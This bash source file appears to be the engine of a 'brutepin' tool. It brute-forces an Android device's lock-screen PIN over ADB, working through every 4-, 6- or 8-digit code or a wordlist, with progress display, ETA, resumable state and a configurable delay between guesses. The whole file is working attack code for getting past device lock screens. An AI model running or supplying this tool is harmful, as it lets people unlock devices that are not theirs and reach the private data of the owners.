#!/bin/bash
# Brute force engine functions

STATE_FILE="brutepin_state.txt"
RUNNING=1

trap 'RUNNING=0' INT TERM

save_state() {
    echo "$1 $2" > "$STATE_FILE"
}

load_state() {
    if [[ -f "$STATE_FILE" ]]; then
        read -r cur tot < "$STATE_FILE"
        echo "$cur"
    fi
}

print_stat() {
    local cur=$1 total=$2 pin=$3 elapsed=$4
    local pct rate eta_str
    pct=$(echo "scale=1; $cur * 100 / $total" | bc 2>/dev/null || echo 0)
    rate=$(echo "scale=0; $cur / $elapsed" | bc 2>/dev/null || echo 0)
    local eta
    eta=$(echo "scale=0; ($total - $cur) / ($rate + 1)" | bc 2>/dev/null || echo 0)
    if (( eta >= 3600 )); then
        eta_str=$(echo "scale=1; $eta / 3600" | bc)"h"
    elif (( eta >= 60 )); then
        eta_str=$(echo "scale=1; $eta / 60" | bc)"m"
    else
        eta_str="${eta}s"
    fi
    local bar_len=20 fill
    fill=$(echo "scale=0; $bar_len * $cur / $total" | bc 2>/dev/null || echo 0)
    printf "\r["
    for ((i=0; i<bar_len; i++)); do
        (( i < fill )) && printf "=" || printf " "
    done
    printf "] %5.1f%% | %s | %4s/s | ETA %s | %s/%s  " "$pct" "$pin" "$rate" "$eta_str" "$cur" "$total"
}

brute_pin() {
    local digits=$1 delay=$2 start=$3 end=$4 resume=$5
    local total s e pin

    case $digits in
        4) total=10000; format="%04d" ;;
        6) total=1000000; format="%06d" ;;
        8) total=100000000; format="%08d" ;;
    esac

    s=$start; e=$end
    (( s < 0 || s >= total )) && s=0
    (( e <= 0 || e > total )) && e=$total

    if (( resume )); then
        local r; r=$(load_state)
        [[ -n "$r" && r -ge s && r -lt e ]] && s=$r
    fi

    echo -e "\n[*] ${digits}-digit: $(printf $format $s) - $(printf $format $((e-1))) = $((e-s)) PINs | Delay: ${delay}s"

    local t0; t0=$(date +%s)

    for ((i=s; i<e && RUNNING; i++)); do
        pin=$(printf $format $i)
        local now elapsed
        now=$(date +%s); elapsed=$((now - t0))
        (( elapsed == 0 )) && elapsed=1
        print_stat $((i-s)) $((e-s)) "$pin" $elapsed

        adb_enter_pin "$pin"
        if adb_unlocked; then
            echo -e "\n\n[!!!] PIN FOUND: $pin"
            save_state 0 0
            return 0
        fi
        (( (i-s) % 10 == 0 && RUNNING )) && save_state $i $total
        sleep $delay
    done
    echo -e "\n[-] Not found."
    return 1
}

brute_wordlist() {
    local file=$1 delay=$2 start=$3 end=$4 resume=$5
    [[ ! -f "$file" ]] && { echo "[-] File not found: $file"; return 1; }

    local total
    total=$(grep -cve '^\s*#' -e '^\s*$' "$file")
    local s=$start e=$end
    (( s < 0 )) && s=0
    (( e <= 0 || e > total )) && e=$total

    if (( resume )); then
        local r; r=$(load_state)
        [[ -n "$r" && r -ge s && r -lt e ]] && s=$r
    fi

    echo -e "\n[*] Wordlist: $total entries | range $s-$e"

    local count=0 line=0 t0
    t0=$(date +%s)

    while IFS= read -r pin && (( RUNNING )); do
        ((line++))
        [[ -z "$pin" || "$pin" == \#* ]] && continue
        (( line < s )) && continue
        ((count++))
        local now elapsed
        now=$(date +%s); elapsed=$((now - t0))
        (( elapsed == 0 )) && elapsed=1
        print_stat $count $((e-s)) "$pin" $elapsed

        adb_enter_pin "$pin"
        if adb_unlocked; then
            echo -e "\n\n[!!!] PIN FOUND: $pin"
            return 0
        fi
        (( count % 10 == 0 && RUNNING )) && save_state $count $total
        sleep $delay
        (( e > 0 && count >= e )) && break
    done < "$file"
    echo -e "\n[-] Not found."
    return 1
}
